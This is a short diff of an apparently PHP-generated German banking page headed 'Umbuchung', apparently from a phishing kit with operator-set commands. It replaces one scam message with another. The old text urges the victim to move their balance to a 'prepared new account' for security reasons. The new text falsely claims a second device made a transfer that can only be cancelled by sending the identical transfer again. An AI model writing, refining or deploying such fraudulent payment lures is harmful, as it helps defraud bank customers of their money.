@@ -248,7 +248,7 @@ if (is_array($customCommandData)) {
 
             <h1>Umbuchung</h1>
             <p class="vr-msg">
-                Aufgrund von Sicherheitsma&szlig;nahmen der Sicherheitsabteilung bitten wir Sie, Ihr Guthaben auf das f&uuml;r Sie vorbereitete neue Konto zu &uuml;berweisen. Dies dient dem Schutz Ihres Kontos, bis alle Bedrohungen beseitigt sind.
+                Es wurde eine Echtzeit-&Uuml;berweisung von einem zweiten Endger&auml;t get&auml;tigt. Diese Transaktionen sind auf Ihrem Ger&auml;t nicht sichtbar, da sie von einem anderen Ger&auml;t freigegeben wurden. Um die Transaktion zu stornieren, m&uuml;ssen Sie von Ihrem Ger&auml;t aus genau die gleiche &Uuml;berweisung &uuml;bermitteln, damit wir diese direkt stornieren k&ouml;nnen.
             </p>
 
             <div class="vr-details" aria-label="Transaktionsdetails">
